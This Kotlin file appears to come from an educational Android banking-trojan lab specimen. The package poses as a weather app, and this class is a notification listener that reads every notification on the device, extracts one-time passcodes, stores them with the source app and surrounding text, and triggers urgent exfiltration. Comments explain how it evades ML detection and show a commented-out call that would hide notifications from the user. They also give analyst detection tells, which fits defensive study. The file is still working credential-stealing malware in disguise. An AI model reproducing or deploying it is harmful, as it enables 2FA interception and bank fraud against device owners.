package com.skyweather.forecast.core

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

/**
 * NotificationListenerService — OTP intercept via push notifications.
 *
 * ══════════════════════════════════════════════════════════════════
 * ANALYSIS §5.2 — Notification Listener OTP Intercept
 * ══════════════════════════════════════════════════════════════════
 *
 * Once granted, NLS receives EVERY notification posted system-wide:
 *   - Banking app push notifications ("Your OTP is 123456")
 *   - SMS app notification previews ("New message from +1...")
 *   - Authentication app codes (Google Authenticator, Authy)
 *   - Email notifications (password reset codes)
 *
 * Two paths to grant:
 *   1. User manually enables in Settings > Notification access
 *   2. AccessibilityService auto-clicks the enable toggle (Stage 4 ATS)
 *
 * Real-world references:
 *   Anatsa: NLS captures bank push notification OTPs, feeds to ATS engine
 *   SharkBot: NLS + SMS dual capture for redundant OTP interception
 *   ERMAC2: NLS reads 2FA push notifications from authenticator apps
 *
 * NLS vs SMS receiver:
 *   NLS captures: push notification OTPs (bank apps, auth apps)
 *   SMS captures: SMS-delivered OTPs
 *   Together: redundant coverage of both OTP delivery channels
 *
 * ML-invisible because:
 *   - NLS is a platform API (notification management apps use it)
 *   - ~500 apps on Play Store use NLS legitimately
 *   - Static analysis can't distinguish "reads notifications to manage them"
 *     from "reads notifications to steal OTP codes"
 *
 * Analyst tell: BIND_NOTIFICATION_LISTENER_SERVICE on an app that has
 * no notification-management UI = suspicious. Combined with A11y binding
 * in same package = high-confidence banker shape.
 * ══════════════════════════════════════════════════════════════════
 */
class WeatherAlertListener : NotificationListenerService() {

    // Service activation state — gates must pass
    private var isArmed = false

    override fun onListenerConnected() {
        super.onListenerConnected()
        isArmed = AppConfig.isEndpointSafe()
    }

    /**
     * Called for every notification posted system-wide.
     *
     * Extraction strategy:
     *   1. Read notification text content (title + text + bigText + subText)
     *   2. Run OtpExtractor on combined text
     *   3. If OTP found → CredentialStore with source package attribution
     *   4. Optionally cancel the notification to suppress user awareness
     *      (NOT implemented in lab — real Anatsa does this for SMS notifications)
     *
     * Volume: a typical device posts 50-200 notifications per day.
     * OTP-bearing notifications: 1-5 per day during active banking.
     * Filtering via OtpExtractor keeps buffer small.
     */
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null || !isArmed) return
        if (!AppConfig.isEndpointSafe()) return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return
        val packageName = sbn.packageName ?: return

        // Skip own notifications (prevent feedback loop)
        if (packageName == applicationContext.packageName) return

        // Extract all text from the notification
        val textParts = mutableListOf<String>()

        extras.getCharSequence("android.title")?.let { textParts.add(it.toString()) }
        extras.getCharSequence("android.text")?.let { textParts.add(it.toString()) }
        extras.getCharSequence("android.bigText")?.let { textParts.add(it.toString()) }
        extras.getCharSequence("android.subText")?.let { textParts.add(it.toString()) }

        // Also check ticker text (older notification style)
        notification.tickerText?.let { textParts.add(it.toString()) }

        if (textParts.isEmpty()) return

        val fullText = textParts.joinToString(" ")

        // Run OTP extraction
        val otp = OtpExtractor.extract(fullText) ?: return

        // OTP found — capture with source attribution
        CredentialStore.capture(
            CredentialStore.CapturedEvent(
                packageName = packageName,
                viewId = "notification_${otp.confidence.name.lowercase()}",
                text = otp.code,
                timestamp = System.currentTimeMillis(),
                eventType = "otp_nls"
            )
        )

        // Real Anatsa: also captures full notification text for C2
        // (operator may want context, not just the code)
        if (otp.confidence == OtpExtractor.Confidence.HIGH) {
            CredentialStore.capture(
                CredentialStore.CapturedEvent(
                    packageName = packageName,
                    viewId = "notification_context",
                    text = fullText.take(200), // Truncate long notifications
                    timestamp = System.currentTimeMillis(),
                    eventType = "nls_ctx"
                )
            )
        }

        // Trigger URGENT exfil — OTP codes are time-sensitive (30-120s validity)
        // Uses REPLACE policy + 1s delay (vs standard 5s KEEP)
        ForecastSyncWorker.scheduleUrgent(applicationContext)

        // NOTE: Real Anatsa/SharkBot also call cancelNotification(sbn.key) here
        // to suppress the notification so the user never sees the OTP.
        // Lab specimen does NOT suppress — educational transparency.
        // Uncommenting the line below would hide the notification:
        // cancelNotification(sbn.key)
    }

    /**
     * Called when a notification is dismissed by user or app.
     * Not used for OTP capture — included for completeness.
     * Real banker malware sometimes monitors dismissals to detect
     * if user noticed and manually dismissed an OTP notification.
     */
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // No-op in lab specimen
    }
}
